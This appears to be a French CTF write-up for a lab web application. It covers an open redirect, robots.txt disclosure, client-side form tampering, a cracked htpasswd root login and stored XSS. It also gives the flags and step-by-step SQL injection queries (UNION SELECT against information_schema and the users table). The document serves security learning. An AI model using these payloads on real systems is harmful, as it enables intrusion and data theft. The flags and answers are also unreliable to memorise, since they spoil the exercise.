# Unvalidated Redirect

reproduire la faille:
<a href="index.php?page=redirect&amp;site=facebook" class="icon fa-facebook"></a>
remplacer la valeur du site par n'importe quoi d'autre 
<a href="index.php?page=redirect&amp;site=other" class="icon fa-facebook"></a>

flag: b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3

description:
Si le paramètre site (ex : ?page=redirect&site=facebook) est utilisé pour construire une URL de redirection sans validation, un attaquant peut le remplacer par n’importe quel domaine malveillant :



# robots disclosure ok

reproduire la faille:
lancer le script `script_robots_disclosure`
`python script_crawler.py 10.13.248.4`

flag: d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466

description:
La faille Robots Disclosure se produit lorsqu'un site web expose involontairement des informations sensibles (comme des répertoires cachés, des fichiers de configuration, ou des indices pour des attaques ultérieures) via des fichiers accessibles publiquement


# Client-Side Manipulation ok

page: http://10.13.248.4/?page=survey#

reproduire la faille:
sur le select d'un vote, ajouter une option: <option value="11">hack</option> [ clique droit sur le select dans l'html de l'inspecteur: edit as HTML]
Il faut que la valeur soit un chiffre (qui n'est pas déjà noté) pour faire apparaitre le flag, le label importe peu
ou alors modifier la valeur a partir du 2eme chiffre (le 1 ne fonctionne pas car c'est la valeur par défaut?)

flag: 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa

description:
La manipulation côté client est une faille de sécurité qui exploite le fait que les données envoyées au serveur peuvent être modifiées directement dans le navigateur de l'utilisateur, sans validation côté serveur.



# SQL Injection members

page: http://10.13.248.4/?page=member

Etape que j'ai faite:

-> voir si il y a faille sql
    1 OR 1=1

-> pour connaitre le nombre de colonne (sert )
    1 ORDER BY 1
    1 ORDER BY 2

-> Extraire les noms des colonnes des tables pour trouver la table users
    1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()

-> Extraire les informations qui semble pertinente de la table users (countersign = contre signer, peu courant dans une table user + possibilite de donnees sensibles)
    1 UNION SELECT first_name, countersign FROM users


-> Ainsi qu'extraire les informations dans Commentaires pour avoir la confirmation de la procédure pour avoir le flag
    1 UNION SELECT first_name, Commentaire FROM users

-> prendre le surname dans le firstName `Flag`
    5ff9d0165b4f92b14994e5c685cdce28 -> MD5 = FortyTwo -> puis le chiffre en SHA256

flag : 9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646

description: 
L'injection SQL est une faille de sécurité qui permet à un attaquant d'interférer avec les requêtes qu'une application envoie à sa base de données. Elle se produit lorsque des entrées utilisateur non sécurisées (comme des champs de formulaire, des paramètres d'URL, etc.) sont directement intégrées dans une requête SQL sans validation ni échappement.



# htpassword - Sensitive Data Exposure

Etape que j'ai faite:

-> http://10.13.248.4/robots.txt

-> http://10.13.248.4/wathever

-> dl le fichier htpasswd

-> decoder le hash MD5 (ne pas utiliser dcode il ne l'a pas): 437394baff5aa33daa618be47b75cb49 = qwerty123@

-> dans l'url, rechercher les url souvent utilisé et contenant des données sensibles: http://10.13.248.4/admin

-> se connecter en utilisant root et qwerty123@


flag: d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff 

description:
Cette faille permet à un attaquant de contourner les mécanismes d'authentification et d'accéder à des zones protégées, simplement en explorant des chemins révélés ou mal configurés.


# Stored XSS /!\ Faille cassée

Etape que j'ai faite:
-> http://10.13.248.4/?page=feedback

-> faire un inspect sur l'input du Name

-> agrandir la taille du maxLength 

-> ecrire `<script>alert(1)</script>` dans l'input

-> mettre du texte dans le comment 


flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

description: 
La faille Stored XSS (Cross-Site Scripting stockée) se produit lorsqu’une application enregistre de manière permanente une entrée utilisateur contenant du code malveillant (souvent du JavaScript) dans une base de données, un fichier ou un autre système de stockage, puis réaffiche ce contenu sans l’assainir.
À chaque fois qu’un utilisateur consulte la page contenant ces données, le code injecté s’exécute automatiquement dans son navigateur, ce qui peut mener au vol de cookies, à la prise de contrôle de session, à la modification du contenu de la page ou à d'autres actions malveillantes.